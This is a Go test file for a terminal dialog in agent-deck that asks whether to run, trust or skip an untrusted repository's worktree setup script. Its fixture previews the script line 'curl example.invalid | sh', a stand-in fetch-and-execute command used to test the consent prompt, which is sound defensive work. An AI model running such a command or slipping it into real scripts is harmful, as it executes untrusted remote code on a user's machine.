package ui

import (
	"strings"
	"testing"
	"time"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"

	"github.com/asheshgoplani/agent-deck/internal/git"
)

func testHookIdentity() git.WorktreeScriptIdentity {
	return git.WorktreeScriptIdentity{
		Kind:         "setup",
		RepoRoot:     "/repos/untrusted",
		ScriptPath:   "/repos/untrusted/.agent-deck/worktree-setup.sh",
		ResolvedPath: "/repos/untrusted/.agent-deck/worktree-setup.sh",
		Interpreter:  git.ScriptInterpreterShell,
		SHA256:       strings.Repeat("ab", 32),
		Preview:      []string{"#!/bin/sh", "curl example.invalid | sh"},
		TotalLines:   25,
	}
}

func keyMsg(s string) tea.KeyMsg {
	switch s {
	case "enter":
		return tea.KeyMsg{Type: tea.KeyEnter}
	case "esc":
		return tea.KeyMsg{Type: tea.KeyEsc}
	case "left":
		return tea.KeyMsg{Type: tea.KeyLeft}
	case "right":
		return tea.KeyMsg{Type: tea.KeyRight}
	}
	return tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune(s)}
}

func TestHookTrustDialog_Keys(t *testing.T) {
	for _, tc := range []struct {
		name string
		keys []string
		want git.ScriptConsentDecision
	}{
		{"enter defaults to skip", []string{"enter"}, git.ScriptConsentSkip},
		{"esc skips", []string{"esc"}, git.ScriptConsentSkip},
		{"o runs once", []string{"o"}, git.ScriptConsentRunOnce},
		{"a trusts", []string{"a"}, git.ScriptConsentTrust},
		{"s skips", []string{"s"}, git.ScriptConsentSkip},
		{"left then enter trusts", []string{"left", "enter"}, git.ScriptConsentTrust},
		{"left left enter runs once", []string{"left", "left", "enter"}, git.ScriptConsentRunOnce},
		{"right clamps at skip", []string{"right", "right", "enter"}, git.ScriptConsentSkip},
	} {
		t.Run(tc.name, func(t *testing.T) {
			d := NewHookTrustDialog()
			reply := make(chan git.ScriptConsentDecision, 1)
			d.Show(testHookIdentity(), reply)
			for _, k := range tc.keys {
				d.HandleKey(keyMsg(k))
			}
			if d.IsVisible() {
				t.Fatal("dialog should close after an answer")
			}
			select {
			case got := <-reply:
				if got != tc.want {
					t.Errorf("decision = %v, want %v", got, tc.want)
				}
			default:
				t.Fatal("no decision delivered")
			}
		})
	}
}

func TestHookTrustDialog_View(t *testing.T) {
	d := NewHookTrustDialog()
	d.SetSize(120, 40)
	d.Show(testHookIdentity(), make(chan git.ScriptConsentDecision, 1))
	view := d.View()
	for _, want := range []string{
		"worktree setup hook",
		"/repos/untrusted",
		"sh -e /repos/untrusted/.agent-deck/worktree-setup.sh",
		strings.Repeat("ab", 32),
		"curl example.invalid | sh",
		"23 more lines",
		"Run once",
		"Always trust this version",
		"Skip",
	} {
		if !strings.Contains(view, want) {
			t.Errorf("view missing %q:\n%s", want, view)
		}
	}
}

func TestHookTrustDialog_FitsSmallTerminalWithLongPreview(t *testing.T) {
	id := testHookIdentity()
	id.Preview = make([]string, git.ScriptPreviewLines)
	for i := range id.Preview {
		id.Preview[i] = "echo review this line before approving"
	}
	id.TotalLines = len(id.Preview)
	d := NewHookTrustDialog()
	d.SetSize(80, 24)
	d.Show(id, make(chan git.ScriptConsentDecision, 1))
	view := d.View()
	if got := lipgloss.Height(view); got > 24 {
		t.Fatalf("dialog height = %d, exceeds 24 rows", got)
	}
	for _, want := range []string{"Run once", "Always trust this version", "Skip"} {
		if !strings.Contains(view, want) {
			t.Errorf("dialog missing %q", want)
		}
	}
}

func TestHookTrustDialog_FitsSmallTerminalWithLongPath(t *testing.T) {
	id := testHookIdentity()
	id.RepoRoot = "/repos/" + strings.Repeat("deep/", 30)
	id.ScriptPath = id.RepoRoot + ".agent-deck/worktree-setup.sh"
	id.ResolvedPath = id.ScriptPath
	d := NewHookTrustDialog()
	d.SetSize(80, 24)
	d.Show(id, make(chan git.ScriptConsentDecision, 1))
	if got := lipgloss.Height(d.View()); got > 24 {
		t.Fatalf("dialog with long repository path uses %d rows", got)
	}
}

// TestHookTrustPrompter_RoundTrip: the prompter posts a request to the
// program and returns the dialog's answer to the waiting worktree goroutine.
func TestHookTrustPrompter_RoundTrip(t *testing.T) {
	msgs := make(chan tea.Msg, 1)
	prompter := NewHookTrustPrompter(func(m tea.Msg) { msgs <- m })

	result := make(chan git.ScriptConsentDecision, 1)
	go func() { result <- prompter(testHookIdentity()) }()

	var req hookTrustRequestMsg
	select {
	case m := <-msgs:
		req = m.(hookTrustRequestMsg)
	case <-time.After(5 * time.Second):
		t.Fatal("prompter did not post a request")
	}
	d := NewHookTrustDialog()
	d.Show(req.id, req.reply)
	d.HandleKey(keyMsg("o"))

	select {
	case got := <-result:
		if got != git.ScriptConsentRunOnce {
			t.Errorf("decision = %v, want run once", got)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("prompter did not return the answer")
	}
}

// TestHome_HookTrustRequest_ShowsDialogAndTakesKeys drives the real Home
// model: the request opens the dialog above everything, and keys go to it.
func TestHome_HookTrustRequest_ShowsDialogAndTakesKeys(t *testing.T) {
	h := NewHome()
	h.width, h.height = 120, 40
	reply := make(chan git.ScriptConsentDecision, 1)

	model, _ := h.Update(hookTrustRequestMsg{id: testHookIdentity(), reply: reply})
	h = model.(*Home)
	if !h.hookTrustDialog.IsVisible() || !h.hasModalVisible() {
		t.Fatal("hook trust dialog should be visible and modal")
	}
	if !strings.Contains(h.View(), "Always trust this version") {
		t.Error("Home.View should render the hook trust dialog")
	}

	model, _ = h.Update(keyMsg("a"))
	h = model.(*Home)
	if h.hookTrustDialog.IsVisible() {
		t.Error("dialog should close after answering")
	}
	if got := <-reply; got != git.ScriptConsentTrust {
		t.Errorf("decision = %v, want trust", got)
	}
}
